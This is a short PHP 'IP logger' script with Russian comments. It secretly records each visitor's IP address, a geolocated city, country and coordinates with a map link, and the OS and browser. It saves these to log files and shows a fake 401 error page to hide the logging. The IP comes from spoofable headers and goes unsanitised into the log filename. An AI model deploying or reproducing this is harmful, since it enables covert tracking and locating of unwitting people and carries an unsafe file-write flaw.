<?php
/*
Author: boldenis44
------------------------------------
Description: Простой iplogger на php.
*/

$logsfolder = "logs"; //Указываем имя папки с логами.
$resptext = "<h1>401 Service temporarily unavailable.</h1>"; //Указываем ответ, можно использовать html или ничего не указывать.


//-------------------------------------------------------------//

function getOS($userAgent) {
   $os_platform  = "Unknown";
   $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $userAgent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser($userAgent) {
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $userAgent))
            $browser = $value;

    return $browser;
}



if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

$useragent = $_SERVER["HTTP_USER_AGENT"];

$ipinfo = json_decode(file_get_contents("http://api.sypexgeo.net/json/".$ip), true);

file_put_contents($logsfolder."/".$ip."#".date("Y-m-d H:i:s").".txt", "IP: " . $ip . "\r\nCity: " . $ipinfo["city"]["name_en"] . "\r\nCountry: " . $ipinfo["country"]["name_en"] . "\r\nLat: " . $ipinfo["city"]["lat"] . "\r\nLon: " . $ipinfo["city"]["lon"] . "\r\nMAP: https://google.com/maps/place/" . $ipinfo["city"]["lat"] . "+" . $ipinfo["city"]["lon"] . "\r\n\r\nOS: " . getOS($useragent). "\r\nBrowser: " . getBrowser($useragent) . "\r\n\r\n\r\nUserAgent: " . $useragent);

echo($resptext);

?>